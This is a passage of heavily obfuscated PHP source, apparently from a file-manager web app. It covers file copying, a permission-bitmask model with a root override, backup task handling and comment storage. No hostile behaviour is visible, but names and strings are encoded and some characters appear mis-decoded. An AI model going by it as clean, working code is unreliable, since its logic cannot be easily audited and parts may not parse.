$this->sourceInfoCache($Ë¸ïíÙÇ); $°ıŸ˜â = $Ëâôƒ->listPath($¯†Ÿ°Ü“); $°ıŸ˜â = $°ıŸ˜â ? $°ıŸ˜â : array($ğœ¾ı£ˆ[86] => array(), $ğœ¾ı£ˆ[85] => array()); $’Ø¶‘µø = array_merge($°ıŸ˜â[$ğœ¾ı£ˆ[86]], $°ıŸ˜â[$ğœ¾ı£ˆ[85]]); $ÉµÍ£Ë = $this->_addFiles($Ëâôƒ, $°ıŸ˜â[$ğœ¾ı£ˆ[86]], $Ò»˜åÏ¹); $†´¿ûÌ½ = array(); foreach ($’Ø¶‘µø as &$´Üç­Ñ›) { if (isset($ÉµÍ£Ë[$´Üç­Ñ›[$ğœ¾ı£ˆ[32]]])) { $´Üç­Ñ› = $ÉµÍ£Ë[$´Üç­Ñ›[$ğœ¾ı£ˆ[32]]]; } $´Üç­Ñ›[$ğœ¾ı£ˆ[469]] = $´Üç­Ñ›[$ğœ¾ı£ˆ[33]] == $ğœ¾ı£ˆ[78]; $´Üç­Ñ›[$ğœ¾ı£ˆ[470]] = substr(_get($´Üç­Ñ›, $ğœ¾ı£ˆ[178], $ğœ¾ı£ˆ[12]), 0, 10); $´Üç­Ñ›[$ğœ¾ı£ˆ[79]] = _get($´Üç­Ñ›, $ğœ¾ı£ˆ[79], 0); $´Üç­Ñ›[$ğœ¾ı£ˆ[525]] = _get($´Üç­Ñ›, $ğœ¾ı£ˆ[525], 0); if (!isset($´Üç­Ñ›[$ğœ¾ı£ˆ[654]]) && $´Üç­Ñ›[$ğœ¾ı£ˆ[525]]) { $Â¦›ÊŠ°[$ğœ¾ı£ˆ[651]][] = $´Üç­Ñ›[$ğœ¾ı£ˆ[525]]; } if ($—ø·÷€) { $˜ıòŞ…É = $this->fileNameExistCache($Ë¸ïíÙÇ, $´Üç­Ñ›[$ğœ¾ı£ˆ[32]]); if ($˜ıòŞ…É) { if ($´Üç­Ñ›[$ğœ¾ı£ˆ[469]] || $—ø·÷€ == REPEAT_SKIP) { continue; } if ($—ø·÷€ == REPEAT_REPLACE) { $”µöœÆì = $this->sourceInfoCache($˜ıòŞ…É); $ÒÌÀÛª­ = $this->fileHistory($”µöœÆì, $´Üç­Ñ›[$ğœ¾ı£ˆ[525]], $´Üç­Ñ›[$ğœ¾ı£ˆ[79]]); if ($ÒÌÀÛª­) { $Â¦›ÊŠ°[$ğœ¾ı£ˆ[613]][] = $´Üç­Ñ›[$ğœ¾ı£ˆ[525]]; } continue; } else { if ($—ø·÷€ == REPEAT_RENAME) { $´Üç­Ñ›[$ğœ¾ı£ˆ[32]] = $this->fileNameAutoCache($Ë¸ïíÙÇ, $´Üç­Ñ›[$ğœ¾ı£ˆ[32]], $—ø·÷€, !1); } } } } if (!$´Üç­Ñ›[$ğœ¾ı£ˆ[469]] && $´Üç­Ñ›[$ğœ¾ı£ˆ[525]] == 0) { continue; } if (!$´Üç­Ñ›[$ğœ¾ı£ˆ[469]] && $´Üç­Ñ›[$ğœ¾ı£ˆ[525]]) { $Â¦›ÊŠ°[$ğœ¾ı£ˆ[613]][] = $´Üç­Ñ›[$ğœ¾ı£ˆ[525]]; } $†´¿ûÌ½[] = $this->_makeItemData($´Üç­Ñ›, $Ôö‡Ìõ†, $´Üç­Ñ›[$ğœ¾ı£ˆ[32]]); } unset($´Üç­Ñ›); if (!empty($†´¿ûÌ½)) { $this->addAll($†´¿ûÌ½); $this->_childrenListSelect($Ë¸ïíÙÇ); } $ğ’Ÿ¬İœ = $this->_childrenList($Ë¸ïíÙÇ); $ğ’Ÿ¬İœ = array_to_keyvalue($ğ’Ÿ¬İœ, $ğœ¾ı£ˆ[32]); foreach ($’Ø¶‘µø as $´Üç­Ñ›) { $”µöœÆì = $ğ’Ÿ¬İœ[$´Üç­Ñ›[$ğœ¾ı£ˆ[32]]]; $ìƒ’Ş— = $”µöœÆì[$ğœ¾ı£ˆ[184]]; $this->_copyApplyMeta($”µöœÆì, $Â¦›ÊŠ°); if ($´Üç­Ñ›[$ğœ¾ı£ˆ[33]] == $ğœ¾ı£ˆ[78]) { $´Üç­Ñ›[$ğœ¾ı£ˆ[87]] = $Ëâôƒ->getPathInner($´Üç­Ñ›[$ğœ¾ı£ˆ[87]]); $this->_copyChildTo($Ëâôƒ, $´Üç­Ñ›[$ğœ¾ı£ˆ[87]], $ìƒ’Ş—, $—ø·÷€, $Â¦›ÊŠ°, $Ò»˜åÏ¹); } } } private function _addFiles($Ò¼ÌºÛÁ, $°Ò¹óòâ, $ı†¦åÎ«) { $áÓù·¾ =& $_SERVER[º·Ï‹¥³]; if (!$°Ò¹óòâ || count($°Ò¹óòâ) == 0) { return array(); } $‰ëåœÒ‹ = array(); foreach ($°Ò¹óòâ as &$«ùÏÅ‘) { Hook::trigger($áÓù·¾[655], $«ùÏÅ‘); $«ùÏÅ‘[$áÓù·¾[87]] = $Ò¼ÌºÛÁ->getPathInner($«ùÏÅ‘[$áÓù·¾[87]]); $æ†‘ïà¬ = $Ò¼ÌºÛÁ->hashSimple($«ùÏÅ‘[$áÓù·¾[87]]); $´íûöË« = $Ò¼ÌºÛÁ->hashMd5($«ùÏÅ‘[$áÓù·¾[87]]); if (strlen($´íûöË«) > 10 && !isset($‰ëåœÒ‹[$´íûöË«])) { $‰ëåœÒ‹[$´íûöË«] = array(); } $«ùÏÅ‘[$áÓù·¾[656]] = $æ†‘ïà¬; $«ùÏÅ‘[$áÓù·¾[531]] = $´íûöË«; $‰ëåœÒ‹[$´íûöË«][] =& $«ùÏÅ‘; if (count($‰ëåœÒ‹[$´íûöË«]) > 1) { $«ùÏÅ‘[$áÓù·¾[654]] = !0; } Hook::trigger($áÓù·¾[657], $«ùÏÅ‘); } unset($«ùÏÅ‘); $Áñ­ŸıÒ = array($áÓù·¾[531] => array($áÓù·¾[7], array_keys($‰ëåœÒ‹))); $Šîƒ‚óÙ = Model($áÓù·¾[658]); $‘ÎÂ¡ × = $Šîƒ‚óÙ->where($Áñ­ŸıÒ)->select(); $‘ÎÂ¡ × = $‘ÎÂ¡ × ? $‘ÎÂ¡ × : array(); foreach ($‘ÎÂ¡ × as $€Ş«†Â) { if (!isset($‰ëåœÒ‹[$€Ş«†Â[$áÓù·¾[531]]])) { continue; } $¹ª’­ÕÂ = $‰ëåœÒ‹[$€Ş«†Â[$áÓù·¾[531]]]; foreach ($¹ª’­ÕÂ as &$«ùÏÅ‘) { $«ùÏÅ‘[$áÓù·¾[525]] = $€Ş«†Â[$áÓù·¾[525]]; $«ùÏÅ‘[$áÓù·¾[654]] = !0; } unset($«ùÏÅ‘); } $øû¦ ŞÕ = array(); foreach ($°Ò¹óòâ as $ˆœ¢»®ı) { Hook::trigger($áÓù·¾[659], $ˆœ¢»®ı); if (isset($ˆœ¢»®ı[$áÓù·¾[654]]) && $ˆœ¢»®ı[$áÓù·¾[654]]) { Hook::trigger($áÓù·¾[660], $ˆœ¢»®ı); continue; } $ ¡Ä¦† = $Ò¼ÌºÛÁ->getPathInner($ˆœ¢»®ı[$áÓù·¾[87]]); $»×Ñ¾– = $Šîƒ‚óÙ->addFileMake($ ¡Ä¦†, $ˆœ¢»®ı[$áÓù·¾[79]], $ˆœ¢»®ı[$áÓù·¾[656]], $ˆœ¢»®ı[$áÓù·¾[531]], $ˆœ¢»®ı[$áÓù·¾[32]], $ı†¦åÎ«); Hook::trigger($áÓù·¾[660], $ˆœ¢»®ı); if (!is_array($»×Ñ¾–)) { continue; } $øû¦ ŞÕ[] = $»×Ñ¾–; } $Šîƒ‚óÙ->addAll($øû¦ ŞÕ); $Áñ­ŸıÒ = array($áÓù·¾[531] => array($áÓù·¾[7], array_keys($‰ëåœÒ‹))); $‘ÎÂ¡ × = $Šîƒ‚óÙ->where($Áñ­ŸıÒ)->select(); $‘ÎÂ¡ × = $‘ÎÂ¡ × ? $‘ÎÂ¡ × : array(); foreach ($‘ÎÂ¡ × as $€Ş«†Â) { if (!isset($‰ëåœÒ‹[$€Ş«†Â[$áÓù·¾[531]]])) { continue; } $äõ”á¤² =& $‰ëåœÒ‹[$€Ş«†Â[$áÓù·¾[531]]]; foreach ($äõ”á¤² as &$«ùÏÅ‘) { $«ùÏÅ‘[$áÓù·¾[525]] = $€Ş«†Â[$áÓù·¾[525]]; } unset($«ùÏÅ‘); } $‘Ú£¼×ì = array(); foreach ($°Ò¹óòâ as $¿©şÛÓ) { $‘Ú£¼×ì[$¿©şÛÓ[$áÓù·¾[32]]] = $¿©şÛÓ; } return $‘Ú£¼×ì; } } goto Céº×‚Éˆ; FµØ£Àâ›: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $‘§ıñ =& $_SERVER[º·Ï‹¥³]; $ò‰ˆÁè’ = array(array($‘§ıñ[478] => LNG($‘§ıñ[1953]), $‘§ıñ[1954] => $‘§ıñ[1955], $‘§ıñ[1956] => 1, $‘§ıñ[1957] => 1, $‘§ıñ[1958] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($‘§ıñ[478] => LNG($‘§ıñ[1959]), $‘§ıñ[1954] => $‘§ıñ[1960], $‘§ıñ[1956] => 2, $‘§ıñ[1957] => 1, $‘§ıñ[1958] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($‘§ıñ[478] => LNG($‘§ıñ[1961]), $‘§ıñ[1954] => $‘§ıñ[1962], $‘§ıñ[1956] => 3, $‘§ıñ[1957] => 1, $‘§ıñ[1958] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($‘§ıñ[478] => LNG($‘§ıñ[1963]), $‘§ıñ[1954] => $‘§ıñ[1964], $‘§ıñ[1956] => 4, $‘§ıñ[1957] => 1, $‘§ıñ[1958] => self::AUTH_SHOW | self::AUTH_VIEW), array($‘§ıñ[478] => LNG($‘§ıñ[1965]), $‘§ıñ[1954] => $‘§ıñ[1966], $‘§ıñ[1956] => 5, $‘§ıñ[1957] => 1, $‘§ıñ[1958] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($‘§ıñ[478] => LNG($‘§ıñ[1967]), $‘§ıñ[1954] => $‘§ıñ[1968], $‘§ıñ[1956] => 6, $‘§ıñ[1957] => 1, $‘§ıñ[1958] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($‘§ıñ[478] => LNG($‘§ıñ[1969]), $‘§ıñ[1954] => $‘§ıñ[1970], $‘§ıñ[1956] => 7, $‘§ıñ[1957] => 1, $‘§ıñ[1958] => 0)); return $ò‰ˆÁè’; } public static function authCheck($¾ù€Øõ, $Ö™ìœî) { $¿ĞíõŞƒ =& $_SERVER[º·Ï‹¥³]; $¾ù€Øõ = intval($¾ù€Øõ); if (KodUser::isRoot() && $GLOBALS[$¿ĞíõŞƒ[6]][$¿ĞíõŞƒ[1971]]) { return !0; } if ($¾ù€Øõ <= 0) { return !1; } if (($¾ù€Øõ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¾ù€Øõ & $Ö™ìœî); } public static function authCheckShow($õƒç±˜ù) { return self::authCheck($õƒç±˜ù, self::AUTH_SHOW); } public static function authCheckView($äÛåŞù—) { return self::authCheck($äÛåŞù—, self::AUTH_VIEW); } public static function authCheckDownload($îİ°ğæ—) { return self::authCheck($îİ°ğæ—, self::AUTH_DOWNLOAD); } public static function authCheckUpload($™ÛÔÌ¤¡) { return self::authCheck($™ÛÔÌ¤¡, self::AUTH_UPLOAD); } public static function authCheckEdit($óì‰Î²È) { return self::authCheck($óì‰Î²È, self::AUTH_EDIT); } public static function authCheckRemove($¦™À‚ÂÕ) { return self::authCheck($¦™À‚ÂÕ, self::AUTH_REMOVE); } public static function authCheckShare($·à©¥îØ) { return self::authCheck($·à©¥îØ, self::AUTH_SHARE); } public static function authCheckComment($›úÎâÚ†) { return self::authCheck($›úÎâÚ†, self::AUTH_COMMENT); } public static function authCheckEvent($¯äÕèè) { return self::authCheck($¯äÕèè, self::AUTH_EVENT); } public static function authCheckRoot($ÅŞÏ¦‹Î) { return self::authCheck($ÅŞÏ¦‹Î, self::AUTH_ROOT); } public static function authCheckAction($¬’ÒÈ®¯, $çš›ÄÙÍ) { $Ó¤“öÙø =& $_SERVER[º·Ï‹¥³]; $ê’™îëæ = array($Ó¤“öÙø[1972] => self::AUTH_VIEW, $Ó¤“öÙø[1247] => self::AUTH_DOWNLOAD, $Ó¤“öÙø[110] => self::AUTH_UPLOAD, $Ó¤“öÙø[1922] => self::AUTH_EDIT, $Ó¤“öÙø[1921] => self::AUTH_REMOVE, $Ó¤“öÙø[1932] => self::AUTH_SHARE, $Ó¤“öÙø[405] => self::AUTH_COMMENT, $Ó¤“öÙø[1742] => self::AUTH_EVENT, $Ó¤“öÙø[1973] => self::AUTH_ROOT); if (!isset($ê’™îëæ[$çš›ÄÙÍ])) { return; } $ã‰éÆå = $ê’™îëæ[$çš›ÄÙÍ]; $¬’ÒÈ®¯ = intval($¬’ÒÈ®¯); if ($¬’ÒÈ®¯ <= 0) { return !1; } if (($¬’ÒÈ®¯ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¬’ÒÈ®¯ & $ã‰éÆå); } public static function authDisable($§¾Ÿ¤¤Ş, $ºË±ÁÑ§) { if (intval($§¾Ÿ¤¤Ş) <= 0) { return 0; } return intval($§¾Ÿ¤¤Ş) & ~$ºË±ÁÑ§; } public $optionType = "\x53\171\163\x74\145\x6d\56\x73\157\x75\x72\143\x65\x41\x75\164\x68\x4c\x69\x73\164"; public $field = array("\156\x61\155\145", "\x61\x75\x74\x68", "\x6c\x61\142\145\154", "\x64\151\163\x70\x6c\x61\171", "\163\x79\x73\164\x65\155", "\163\157\162\164"); public function initData() { $ÄĞºœ©é = $this->authDefault(); foreach ($ÄĞºœ©é as $Ñªµ‰³‘) { $this->add($Ñªµ‰³‘); } } public function findAuth($ÕÍÑØıç, $âà™Èù…) { $¥Èí‰ñ =& $_SERVER[º·Ï‹¥³]; $ØÎ”şşß = parent::listData(); foreach ($ØÎ”şşß as $Íåúç¶) { $ëòÀ×³ = intval($Íåúç¶[$¥Èí‰ñ[471]]); if ($ëòÀ×³ <= 0 || $Íåúç¶[$¥Èí‰ñ[1974]] == 0) { continue; } if (($ëòÀ×³ & $ÕÍÑØıç) != $ÕÍÑØıç) { continue; } if (($ëòÀ×³ & $âà™Èù…) != 0) { continue; } return $Íåúç¶[$¥Èí‰ñ[459]]; } return !1; } public function findAuthReadOnly() { $ôÂÏ„²ö = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $â‹„º = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ôÂÏ„²ö, $â‹„º); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $ÏÒæÃÖØ =& $_SERVER[º·Ï‹¥³]; $ãşñ·Ñº = parent::listData(); $„ğı¥Ã = !1; foreach ($ãşñ·Ñº as $¶Ô„Ÿª€) { if ($¶Ô„Ÿª€[$ÏÒæÃÖØ[471]] <= 0 || $¶Ô„Ÿª€[$ÏÒæÃÖØ[1974]] == $ÏÒæÃÖØ[219]) { continue; } if (!$„ğı¥Ã) { $„ğı¥Ã = $¶Ô„Ÿª€; continue; } if ($„ğı¥Ã[$ÏÒæÃÖØ[471]] > $¶Ô„Ÿª€[$ÏÒæÃÖØ[471]]) { $„ğı¥Ã = $¶Ô„Ÿª€; } } return $„ğı¥Ã ? $„ğı¥Ã[$ÏÒæÃÖØ[459]] : $ÏÒæÃÖØ[12]; } public function listData($À£ÏÌúü = false, $ÓºÕİÑá = "\163\157\162\x74", $²ÉüŸ®â = false) { return parent::listData($À£ÏÌúü, $ÓºÕİÑá, $²ÉüŸ®â); } public function update($ôäùó Â, $ÏıÚØ«²) { $öÇ”‡ø =& $_SERVER[º·Ï‹¥³]; $ÉıÖ’¨Ù = parent::listData($ôäùó Â); $šÉ ›«• = $this->findByName($ÏıÚØ«²[$öÇ”‡ø[32]]); if (!$ÉıÖ’¨Ù || $šÉ ›«• && $šÉ ›«•[$öÇ”‡ø[459]] != $ÉıÖ’¨Ù[$öÇ”‡ø[459]]) { return !1; } $this->filterAuth($ÏıÚØ«²[$öÇ”‡ø[471]]); return parent::update($ôäùó Â, $ÏıÚØ«²); } public function remove($¶‡åşÚ¥) { $ö ¾‰¤ë = parent::listData($¶‡åşÚ¥); if (!$ö ¾‰¤ë || $ö ¾‰¤ë[$_SERVER[º·Ï‹¥³][182]]) { return !1; } return parent::remove($¶‡åşÚ¥); } public function add($•‡¶àÊÚ = array()) { $Şæ†ÆÊ =& $_SERVER[º·Ï‹¥³]; if ($this->findByName($•‡¶àÊÚ[$Şæ†ÆÊ[32]])) { return !1; } $™ËÈøÕÚ = array($Şæ†ÆÊ[32] => $Şæ†ÆÊ[12], $Şæ†ÆÊ[471] => 1, $Şæ†ÆÊ[1975] => $Şæ†ÆÊ[1962], $Şæ†ÆÊ[1974] => 1, $Şæ†ÆÊ[182] => 0, $Şæ†ÆÊ[1976] => 0); $•‡¶àÊÚ = array_merge($™ËÈøÕÚ, $•‡¶àÊÚ); $•‡¶àÊÚ[$Şæ†ÆÊ[1976]] = $this->getSort(); $this->filterAuth($•‡¶àÊÚ[$Şæ†ÆÊ[471]]); return parent::insert($•‡¶àÊÚ); } private function getSort() { $áÌş¼³Ë =& $_SERVER[º·Ï‹¥³]; $ìÎ‚ÚÂ® = parent::listData(); $ËêÅ¥¬ = array_to_keyvalue($ìÎ‚ÚÂ®, $áÌş¼³Ë[12], $áÌş¼³Ë[1976]); return empty($ËêÅ¥¬) ? 0 : max($ËêÅ¥¬) + 1; } private function filterAuth(&$¡‡şø®Ö) { if (!$¡‡şø®Ö) { return; } $ŸÆ˜Ö•¼ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $½‡¯¥€Ù = array(); foreach ($ŸÆ˜Ö•¼ as $Ë¤ñ¯ù) { if ($¡‡şø®Ö & $Ë¤ñ¯ù) { $½‡¯¥€Ù[] = $Ë¤ñ¯ù; } } if (in_array(self::AUTH_ROOT, $½‡¯¥€Ù)) { $¡‡şø®Ö = array_sum($ŸÆ˜Ö•¼); return; } $€€°™òĞ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($½‡¯¥€Ù as $Ë¤ñ¯ù) { if (isset($€€°™òĞ[$Ë¤ñ¯ù])) { $½‡¯¥€Ù = array_merge($½‡¯¥€Ù, $€€°™òĞ[$Ë¤ñ¯ù]); } } $½‡¯¥€Ù[] = self::AUTH_SHOW; $¡‡şø®Ö = array_sum(array_unique($½‡¯¥€Ù)); } public function sort($²ßØ€ÂÀ, $ÙÄÖóÓ) { return parent::update($²ßØ€ÂÀ, $ÙÄÖóÓ); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\56\x62\x61\x63\x6b\165\160\114\151\163\164"; public $field = array("\151\x6f", "\156\141\x6d\x65", "\163\164\x61\164\x75\163", "\x63\157\156\x74\145\156\x74", "\155\141\x6e\165\141\x6c", "\x72\x65\163\x75\x6c\164", "\x74\x69\x6d\x65\x46\162\157\155", "\164\x69\x6d\x65\x54\157"); public function config() { $±¥ä÷Ò¶ =& $_SERVER[º·Ï‹¥³]; $œñ¸Ÿıß = Model($±¥ä÷Ò¶[822])->get($±¥ä÷Ò¶[834]); $œñ¸Ÿıß = json_decode($œñ¸Ÿıß, !0); $œñ¸Ÿıß = is_array($œñ¸Ÿıß) ? $œñ¸Ÿıß : array(); if (!isset($œñ¸Ÿıß[$±¥ä÷Ò¶[806]])) { $œñ¸Ÿıß[$±¥ä÷Ò¶[806]] = $±¥ä÷Ò¶[91]; } unset($œñ¸Ÿıß[$±¥ä÷Ò¶[1724]]); Action($±¥ä÷Ò¶[1977])->taskInit(); Model($±¥ä÷Ò¶[1723])->cacheClear(); $‘½¿ìœö = $±¥ä÷Ò¶[1978]; $­üîĞ‹î = Model($±¥ä÷Ò¶[1979])->findByKey($±¥ä÷Ò¶[1742], $‘½¿ìœö); if (!$­üîĞ‹î) { $­üîĞ‹î = array(); } if (isset($­üîĞ‹î[$±¥ä÷Ò¶[197]])) { $­üîĞ‹î[$±¥ä÷Ò¶[197]] = json_decode($­üîĞ‹î[$±¥ä÷Ò¶[197]], !0); } if (isset($œñ¸Ÿıß[$±¥ä÷Ò¶[197]])) { $­üîĞ‹î[$±¥ä÷Ò¶[197]][$±¥ä÷Ò¶[1727]] = $œñ¸Ÿıß[$±¥ä÷Ò¶[197]]; unset($œñ¸Ÿıß[$±¥ä÷Ò¶[197]]); } return array_merge($­üîĞ‹î, $œñ¸Ÿıß); } public function listData($°ò¹ùáÍ = false, $ªøÊ½ = "\x6d\x6f\x64\x69\x66\x79\124\151\155\145", $áÓîğ¤¶ = false) { return parent::listData($°ò¹ùáÍ, $ªøÊ½, !0); } public function lastItem() { $§İ»Ò€ = $this->listData(); return !empty($§İ»Ò€[0]) ? $§İ»Ò€[0] : null; } public function kill($¬‹ÔéÓ…) { $ÈÊÔ§§è =& $_SERVER[º·Ï‹¥³]; $†Ôò‡øş = $this->listData($¬‹ÔéÓ…); if (!$†Ôò‡øş || empty($†Ôò‡øş[$ÈÊÔ§§è[32]])) { return !0; } Task::kill($ÈÊÔ§§è[833]); Task::kill($ÈÊÔ§§è[851]); Task::kill($ÈÊÔ§§è[860]); $…Õ¶•”Ü = $†Ôò‡øş[$ÈÊÔ§§è[32]]; $ÑÙÙÏî = TEMP_FILES . $ÈÊÔ§§è[830] . $…Õ¶•”Ü . $ÈÊÔ§§è[8]; IO::remove($ÑÙÙÏî, !1); return $this->remove($¬‹ÔéÓ…); } public function remove($Ğò¦¾‡š) { $×Œ‰’— = $this->listData($Ğò¦¾‡š); if (!$×Œ‰’—) { return !0; } return $this->backupRemove($×Œ‰’—); } private function backupRemove($¾›øĞĞ¤) { parent::remove($¾›øĞĞ¤[$_SERVER[º·Ï‹¥³][459]]); $°¡˜Òˆ = $this->backupPath($¾›øĞĞ¤); IO::remove($°¡˜Òˆ, !1); return !0; } private function backupPath($¤˜ª„») { $‡ıï³À =& $_SERVER[º·Ï‹¥³]; $®ÑÆğòÄ = $¤˜ª„»[$‡ıï³À[32]]; $‡Ìª¥âõ = Model($‡ıï³À[822])->get($‡ıï³À[823]); $Ûïã³ì˜ = substr(md5($‡ıï³À[824] . $‡Ìª¥âõ . $®ÑÆğòÄ), 0, 8); return "\173\x69\157\72{$¤˜ª„»[$‡ıï³À[803]]}\x7d\x2f\144\141\164\x61\x62\141\x73\145\57\142\x61\143\x6b\x75\160\x2f" . $®ÑÆğòÄ . $‡ıï³À[11] . $Ûïã³ì˜; } public function start() { $Î†¬ãÉ¿ =& $_SERVER[º·Ï‹¥³]; if ($GLOBALS[$Î†¬ãÉ¿[6]][$Î†¬ãÉ¿[92]][$Î†¬ãÉ¿[1980]] != $Î†¬ãÉ¿[91]) { return !0; } $š¾—Òáî = $this->config(); if (!$š¾—Òáî || $š¾—Òáî[$Î†¬ãÉ¿[1724]] != $Î†¬ãÉ¿[91]) { return !1; } $¨“ñ–Ö = $this->process(); foreach ($¨“ñ–Ö as $‰Ñè€¥Å) { if ($‰Ñè€¥Å) { return Task::restart($‰Ñè€¥Å[$Î†¬ãÉ¿[459]]); } } $ø‚¸·¹÷ = new Backup(); $Ğà¥ªÕ  = $ø‚¸·¹÷->db(); if ($Ğà¥ªÕ ) { $Ğà¥ªÕ  = $ø‚¸·¹÷->dbFile(); if ($Ğà¥ªÕ  && $š¾—Òáî[$Î†¬ãÉ¿[806]] == $Î†¬ãÉ¿[219]) { $Ğà¥ªÕ  = $ø‚¸·¹÷->file(); } } Backup::set(array($Î†¬ãÉ¿[802] => 1, $Î†¬ãÉ¿[813] => time())); return !0; } public function process() { $™Ìïİ©ï =& $_SERVER[º·Ï‹¥³]; $ÀÑ‘óèÛ = array($™Ìïİ©ï[809] => Task::get($™Ìïİ©ï[833]), $™Ìïİ©ï[814] => Task::get($™Ìïİ©ï[851]), $™Ìïİ©ï[221] => Task::get($™Ìïİ©ï[860])); $Š÷“”–Á = !1; foreach ($ÀÑ‘óèÛ as &$—ó‰Æ“) { if ($Š÷“”–Á) { $—ó‰Æ“ = !1; continue; } if ($—ó‰Æ“) { $‰ öÏ‹Ø = intval(_get($—ó‰Æ“, $™Ìïİ©ï[1759], 0)); if (time() - $‰ öÏ‹Ø > 7200) { Task::kill($—ó‰Æ“[$™Ìïİ©ï[459]]); $Š÷“”–Á = !0; $—ó‰Æ“ = !1; } } } return $ÀÑ‘óèÛ; } public function restore() { $¢‘”×ÙŸ =& $_SERVER[º·Ï‹¥³]; ActionCall($¢‘”×ÙŸ[1109], !0, 1); ActionCall($¢‘”×ÙŸ[1109], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\x6d\x65\156\164"; protected $tableMeta = array("\164\x61\x62\154\145\x4e\141\155\145" => "\143\x6f\x6d\x6d\x65\156\x74\137\155\145\164\141", "\155\145\164\x61\106\151\x65\154\x64" => "\143\x6f\x6d\155\x65\156\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ÓĞêóˆ) { $¾ÒÑæÆ =& $_SERVER[º·Ï‹¥³]; if ($ÓĞêóˆ[$¾ÒÑæÆ[1981]]) { $©Éä”“ğ = $this->where(array($¾ÒÑæÆ[1982] => $ÓĞêóˆ[$¾ÒÑæÆ[1981]]))->find(); if (!$©Éä”“ğ || $©Éä”“ğ[$¾ÒÑæÆ[181]] != $ÓĞêóˆ[$¾ÒÑæÆ[181]] || $©Éä”“ğ[$¾ÒÑæÆ[554]] != $ÓĞêóˆ[$¾ÒÑæÆ[554]]) { return !1; } $this->where(array($¾ÒÑæÆ[1982] => $ÓĞêóˆ[$¾ÒÑæÆ[1981]]))->setAdd($¾ÒÑæÆ[1983], 1); } $ÓĞêóˆ[$¾ÒÑæÆ[1984]] = 0; $ÓĞêóˆ[$¾ÒÑæÆ[1983]] = 0; $ÓĞêóˆ[$¾ÒÑæÆ[802]] = 1; return $this->add($ÓĞêóˆ); } public function commentCount($…üÖÊ ø, $´Ù´Ç–, $Ö…²‘¼û = false) { $»ÛİĞ¹ =& $_SERVER[º·Ï‹¥³]; if (!$…üÖÊ ø) { return array(); } if (is_string($…üÖÊ ø) || is_int($…üÖÊ ø)) { $…üÖÊ ø = array($…üÖÊ ø); } $ßßñ€ñĞ = array($»ÛİĞ¹[554], $»ÛİĞ¹[1985] => $»ÛİĞ¹[550]); $ãó•ğ¿… = array($»ÛİĞ¹[554] => array($»ÛİĞ¹[7], $…üÖÊ ø), $»ÛİĞ¹[181] => $´Ù´Ç–); if ($Ö…²‘¼û) { $ãó•ğ¿…[$»ÛİĞ¹[1754]] = $Ö…²‘¼û; } $“ËÀ¶Ó = $this->field($ßßñ€ñĞ)->where($ãó•ğ¿…)->group($»ÛİĞ¹[554])->select(); return array_to_keyvalue($“ËÀ¶Ó, $»ÛİĞ¹[554], $»ÛİĞ¹[550]); } public function starTarget($òà‰‰‡, $­¦§öÂÔ) { $Ëëì¶ü¡ =& $_SERVER[º·Ï‹¥³]; $È¤¨ŸÈ« = $òà‰‰‡ + self::TYPE_STAR_OFFSET; $ÖÜÙŠüë = array($Ëëì¶ü¡[1754] => USER_ID, $Ëëì¶ü¡[181] => $È¤¨ŸÈ«, $Ëëì¶ü¡[554] => $­¦§öÂÔ); $ÍÇÖê¤ü = $this->where($ÖÜÙŠüë)->find(); if ($ÍÇÖê¤ü) { return $this->where(array($Ëëì¶ü¡[459] => $ÍÇÖê¤ü[$Ëëì¶ü¡[459]]))->delete(); } $—ß§—æ‹ = array($Ëëì¶ü¡[1981] => 0, $Ëëì¶ü¡[1754] => USER_ID, $Ëëì¶ü¡[802] => 1, $Ëëì¶ü¡[806] => $Ëëì¶ü¡[12], $Ëëì¶ü¡[181] => 